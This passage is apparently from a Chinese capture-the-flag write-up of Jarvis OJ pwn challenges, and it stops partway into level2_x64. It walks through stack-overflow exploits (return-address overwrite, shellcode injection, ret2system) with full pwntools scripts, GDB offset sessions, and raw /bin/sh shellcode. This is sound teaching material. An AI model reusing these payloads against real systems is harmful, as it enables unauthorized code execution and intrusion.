<h4 id="查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><a href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell" class="headerlink" title="查看函数窗口 找到callsystem() 查看代码发现已经写好了shell"></a>查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</h4><p>屡一下流程 main函数跳转到了vulnerable_function()然后 read一个大小不超过512的字节 然后返回函数</p>
<p>思路很清晰了 我们需要将vulnerable_function()函数的返回地址覆盖为callsystem()函数的地址即可成功getshell</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">buf <span class="token number">0x80</span>
ebp <span class="token number">0x8</span>
淹没bp <span class="token number">0x80</span><span class="token operator">+</span><span class="token number">0x8</span>
callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>
</code></pre>
<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn0'</span><span class="token punctuation">)</span>

callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/Desktop$ python pwn0.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./pwn0'</span><span class="token keyword">:</span> pid 3517
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
Hello, World
$ <span class="token function">ls</span>
core               peda-session-pwn50.txt  pwn0.py    pwn50.py
peda-session-pwn0.txt  pwn0               pwn50
$
</code></pre>
<p>成功getshell</p>
<h2 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h2><h3 id="先进行check"><a href="#先进行check" class="headerlink" title="先进行check"></a>先进行check</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/Desktop$ checksec ./guestbook
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/Desktop/guestbook'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<p>没开任何保护 64位ELF</p>
<h3 id="IDA分析程序"><a href="#IDA分析程序" class="headerlink" title="IDA分析程序"></a>IDA分析程序</h3><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/4.jpg" alt="ida1"></p>
<p>可以看到程序 只是进行了 write read </p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">good_game</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  FILE <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Fh] [rbp-9h]</span>

  v0 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf <span class="token operator">=</span> result<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>找到关键函数 good_game </p>
<h3 id="思路很简单-简单栈溢出并且覆盖ret为good-game地址即可"><a href="#思路很简单-简单栈溢出并且覆盖ret为good-game地址即可" class="headerlink" title="思路很简单 简单栈溢出并且覆盖ret为good_game地址即可"></a>思路很简单 简单栈溢出并且覆盖ret为good_game地址即可</h3><h3 id="good-game-地址："><a href="#good-game-地址：" class="headerlink" title="good_game 地址："></a>good_game 地址：</h3><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/5.jpg" alt="ida1"><br>通过IDA即可找到  0x400620</p>
<h3 id="GDB调试找到溢出偏移"><a href="#GDB调试找到溢出偏移" class="headerlink" title="GDB调试找到溢出偏移"></a>GDB调试找到溢出偏移</h3><p>加载程序 并尝试运行程序</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ <span class="token function">file</span> guestbook
Reading symbols from guestbook<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
gdb-peda$ pattern create 300
<span class="token string">'AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ r
Starting program: /home/ios/Desktop/guestbook AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Input your message:
AAA%AAsAABAA<span class="token variable">$AAnAACAA</span>-AA<span class="token punctuation">(</span>AADAA<span class="token punctuation">;</span>AA<span class="token punctuation">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%<span class="token punctuation">(</span>A%DA%<span class="token punctuation">;</span>A%<span class="token punctuation">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
I have received your message, Thank you<span class="token operator">!</span>

Program received signal SIGSEGV, Segmentation fault.
<span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
RAX: 0x29 <span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span>
RBX: 0x0 
RCX: 0x7ffff7b042c0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__write_nocancel+7<span class="token operator">></span>:    <span class="token function">cmp</span>    rax,0xfffffffffffff001<span class="token punctuation">)</span>
RDX: 0x29 <span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span>
RSI: 0x400738 <span class="token punctuation">(</span><span class="token string">"I have received your message, Thank you!\n"</span><span class="token punctuation">)</span>
RDI: 0x1 
RBP: 0x400690 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>
RSP: 0x7fffffffde28 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
RIP: 0x400525 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+69<span class="token operator">></span>:    ret<span class="token punctuation">)</span>
R8 <span class="token keyword">:</span> 0x400700 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_fini<span class="token operator">></span>:    repz ret<span class="token punctuation">)</span>
R9 <span class="token keyword">:</span> 0x7ffff7de7ab0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>
R10: 0x37b 
R11: 0x246 
R12: 0x400526 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>
R13: 0x7fffffffdf00 --<span class="token operator">></span> 0x2 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 <span class="token punctuation">(</span>carry PARITY adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
   0x400514 <span class="token operator">&lt;</span>main+52<span class="token operator">></span>:    mov    edi,0x1
   0x400519 <span class="token operator">&lt;</span>main+57<span class="token operator">></span>:    call   0x400480 <span class="token operator">&lt;</span>write@plt<span class="token operator">></span>
   0x40051e <span class="token operator">&lt;</span>main+62<span class="token operator">></span>:    add    rsp,0x88
<span class="token operator">=</span><span class="token operator">></span> 0x400525 <span class="token operator">&lt;</span>main+69<span class="token operator">></span>:    ret    
   0x400526 <span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp
   0x400528 <span class="token operator">&lt;</span>_start+2<span class="token operator">></span>:    mov    r9,rdx
   0x40052b <span class="token operator">&lt;</span>_start+5<span class="token operator">></span>:    pop    rsi
   0x40052c <span class="token operator">&lt;</span>_start+6<span class="token operator">></span>:    mov    rdx,rsp
<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
0000<span class="token operator">|</span> 0x7fffffffde28 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
0008<span class="token operator">|</span> 0x7fffffffde30 <span class="token punctuation">(</span><span class="token string">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
0016<span class="token operator">|</span> 0x7fffffffde38 <span class="token punctuation">(</span><span class="token string">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
0024<span class="token operator">|</span> 0x7fffffffde40 <span class="token punctuation">(</span><span class="token string">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
0032<span class="token operator">|</span> 0x7fffffffde48 <span class="token punctuation">(</span><span class="token string">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
0040<span class="token operator">|</span> 0x7fffffffde50 <span class="token punctuation">(</span><span class="token string">"AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
0048<span class="token operator">|</span> 0x7fffffffde58 <span class="token punctuation">(</span><span class="token string">"AAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
0056<span class="token operator">|</span> 0x7fffffffde60 <span class="token punctuation">(</span><span class="token string">"ZAAxAAyAAzA%%A%sA%BA%<span class="token variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400525 <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>发现错误停止在了 main函数 的ret处<br>接下来计算缓冲区的大小<br>由于程序使用的内存地址不能大于0x00007fffffffffff，PC指针并没有指向类似于0x41414141那样地址，但是ret指令等于pop rip，可以通过查看栈顶指针的值确定下一步程序运行的地址。</p>
<pre><code>gdb-peda$ x/gx $rsp
0x7fffffffde28:    0x41416d4141514141
gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</code></pre><p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。<br>得到偏移为136 所以我们就可以构造exp了</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true">#p = process('./guestbook')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9876</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400620</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your message:\n'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>运行测试一下<br><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/6.jpg" alt="ida1"><br>成功拿到flag</p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec level1
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/level1'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
    RWX:      Has RWX segments
ios@ubuntu:~$
</code></pre>
<p>啥都没开2333<br>载入IDA分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-88h]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What's this:%p?\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>发现 read 直接读了buf 存在漏洞<br>利用思路 覆盖溢出buf 写入shellcode 起shell<br>生成shellcode方法</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>或者使用已经生成好的shellcode</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span>
</code></pre>
<p>最终利用exp</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>from pwn import *
p = process(&#39;./level1&#39;)
shellcode = &quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;
ret = p.recvuntil(&#39;?&#39;,drop=True)
ret = int(ret[12:],16)
print hex(ret)
payload = shellcode + &#39;a&#39;*(0x88-len(shellcode)) +&#39;bbbb&#39;+p32(ret)
p.sendline(payload)

p.interactive()
</code></pre><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/7.jpg" alt="ida1"><br>成功拿到shell </p>
<h2 id="level2-x86"><a href="#level2-x86" class="headerlink" title="level2_x86"></a>level2_x86</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec level2x86
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/level2x86'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>载入IDA分析程序</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'Hello World!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>main函数主要调用system函数输出 然后调用vulnerable_function()函数 我们跟进看一下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-88h]</span>

  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
<span class="token punctuation">}</span>
</code></pre>
<p>read()函数这里限制了读入buf的长度0x100</p>
<p>  但是 我们这里利用并不会受到影响</p>
<p>shift+F12尝试搜索程序是否自带shell</p>
<p>因为程序需要调用system函数 所以可以找到system.plt地址</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>查看IDA中函数调用窗口找到system.plt_addr</p>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/8.jpg" alt="8"></p>
<p>找到地址0x8048320</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>利用pwntools获取</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level2x86'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level2x86'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#system =0x8048320</span>

system <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
</code></pre>
<p>即可获取</p>
<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-88h]</span>
</code></pre>
<p>计算偏移 ret到buf的距离为 ebp+0x4-（ebp-88h）</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/d 0x4+0x88
<span class="token variable">$1</span> <span class="token operator">=</span> 140
gdb-peda$
</code></pre>
<p>所以偏移为140</p>
<p>思路：我们溢出覆盖到ret为system地址应为压栈顺序所以先伪造system(‘bin/sh’)的返回地址(任意地址)接着传入bin/sh_addr</p>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/9.jpg" alt="9"></p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment" spellcheck="true">#p = process('./level2x86')</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level2x86'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#system =0x8048320</span>

system <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
sh <span class="token operator">=</span><span class="token number">0x804A024</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">140</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试远程获取shell</p>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/10.jpg" alt="10"></p>
<h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>看题目都可以知道只是编译为64位elf</p>
<p>和上到题目思路类似</p>
<p>检查下程序保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec level2_x64
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/level2_x64'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<p>只开启NX</p>
